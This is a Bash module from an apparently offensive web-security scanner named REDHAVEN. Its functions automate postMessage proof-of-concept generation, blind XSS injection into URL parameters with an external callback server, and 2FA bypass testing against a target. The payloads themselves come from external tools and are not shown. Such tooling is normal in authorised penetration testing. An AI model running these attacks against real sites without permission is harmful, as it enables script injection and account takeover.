#!/bin/bash
# REDHAVEN Module — Sourced by scanner.sh
# Do not run directly

# === ADVANCED ATTACKS ===
# 33. POSTMESSAGE SECURITY ANALYZER (Phase 2B)
run_postmessage_analyzer() {
    if check_dependency "$OUT_DIR/vulns/postmessage_findings.txt" "PostMessage Analyzer"; then return; fi
    log_phase "33: POSTMESSAGE SECURITY ANALYSIS"
    
    # Check if JS files have been downloaded
    if [ ! -d "$OUT_DIR/.temp/js_download" ] || [ -z "$(ls -A $OUT_DIR/.temp/js_download 2>/dev/null)" ]; then
        log_warn "No JS files found. Run Secrets Hunter (Module 8) first."
        return
    fi
    
    log_step "Analyzing postMessage handlers in JavaScript files..."
    python3 /usr/local/bin/postmessage_analyzer \
        --js-dir "$OUT_DIR/.temp/js_download" \
        --generate-poc \
        > "$OUT_DIR/vulns/postmessage_findings.txt" 2>&1 || true
    
    # Move generated PoCs to reports
    if ls postmessage_poc_*.html 1> /dev/null 2>&1; then
        mkdir -p "$OUT_DIR/reports/pocs"
        mv postmessage_poc_*.html "$OUT_DIR/reports/pocs/" || true
        log_stat "PoC Files Generated" "$(ls $OUT_DIR/reports/pocs/postmessage_poc_*.html 2>/dev/null | wc -l)"
    fi
    
    log_success "PostMessage analysis completed"
}

# 34. BLIND XSS HUNTER (Phase 2B - Requires Callback Server)
run_blind_xss() {
    log_phase "34: BLIND XSS HUNTER"
    
    # Check for callback server configuration
    local callback_domain=""
    
    # Look for callback in environment or config
    if [ -n "${BLIND_XSS_CALLBACK:-}" ]; then
        callback_domain="$BLIND_XSS_CALLBACK"
    elif [ -f "/results/callback.txt" ]; then
        callback_domain=$(cat /results/callback.txt | head -n1)
    else
        log_warn "No callback server configured!"
        log_warn "Set BLIND_XSS_CALLBACK env var or create /results/callback.txt"
        log_warn "Example: export BLIND_XSS_CALLBACK='xxx.interact.sh'"
        log_warn "Skipping Blind XSS testing."
        return
    fi
    
    log_step "Using callback server: $callback_domain"
    
    # Test URLs with parameters (most likely to be vulnerable)
    if [ -s "$OUT_DIR/endpoints/params_only.txt" ]; then
        log_step "Injecting Blind XSS payloads into parameters..."
        python3 /usr/local/bin/blind_xss \
            -l "$OUT_DIR/endpoints/params_only.txt" \
            -c "$callback_domain" \
            --context all > "$OUT_DIR/vulns/blind_xss_injections.txt" 2>&1 || true
        
        log_success "Blind XSS payloads injected"
        log_warn "IMPORTANT: Monitor your callback server for hits!"
    else
        log_warn "No parameterized URLs found"
    fi
}

# 35. 2FA BYPASS TESTER (Phase 2B - Requires Manual Configuration)
run_twofa_bypass() {
    log_phase "35: 2FA/MFA BYPASS TESTING"
    
    # Check if 2FA endpoints are configured
    if [ -z "${TFA_VERIFY_URL:-}" ]; then
        log_warn "No 2FA endpoints configured!"
        log_warn "Set TFA_VERIFY_URL and optionally TFA_ENROLLMENT_URL"
        log_warn "Example: export TFA_VERIFY_URL='https://target.com/2fa/verify'"
        log_warn "Skipping 2FA bypass testing."
        return
    fi
    
    log_step "Testing 2FA security on: ${TFA_VERIFY_URL:-}"
    
    # Build command
    local cmd="python3 /usr/local/bin/twofa_bypass -u https://$TARGET --verify ${TFA_VERIFY_URL:-}"
    
    if [ -n "${TFA_ENROLLMENT_URL:-}" ]; then
        cmd="$cmd --enrollment ${TFA_ENROLLMENT_URL:-}"
    fi
    
    if [ -n "${SESSION_COOKIE:-}" ]; then
        cmd="$cmd --session ${SESSION_COOKIE:-}"
    fi
    
    # Run tests
    $cmd > "$OUT_DIR/vulns/2fa_bypass_results.txt" 2>&1 || true
    
    log_success "2FA bypass testing completed"
}

